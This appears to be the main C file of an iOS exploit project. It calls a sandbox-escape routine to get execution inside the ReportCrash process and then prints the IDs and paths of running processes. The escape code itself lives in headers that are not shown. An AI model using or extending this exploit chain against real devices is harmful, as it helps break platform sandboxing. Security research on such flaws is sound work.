#include "main/blanket_main.h"

#include "log/log.h"
#include "sandbox_escape/sandbox_escape.h"
#include "sandbox_escape/threadexec_routines.h"

#include <CoreFoundation/CoreFoundation.h>
#include <stdlib.h>

void
blanket_main() {
	DEBUG_TRACE(1, "%s", __func__);
	threadexec_t reportcrash_tx = sandbox_escape();
	if (reportcrash_tx == NULL) {
		goto fail;
	}
	pid_t *pids;
	char **paths;
	size_t count;
	bool ok = threadexec_list_pids_with_paths(reportcrash_tx, &pids, &paths, &count);
	if (ok) {
		for (size_t i = 0; i < count; i++) {
			printf("%4u  %s\n", pids[i], paths[i]);
		}
		free(pids);
	}
	threadexec_deinit(reportcrash_tx);
fail:
	DEBUG_TRACE(1, "%s: done", __func__);
	exit(1);
}
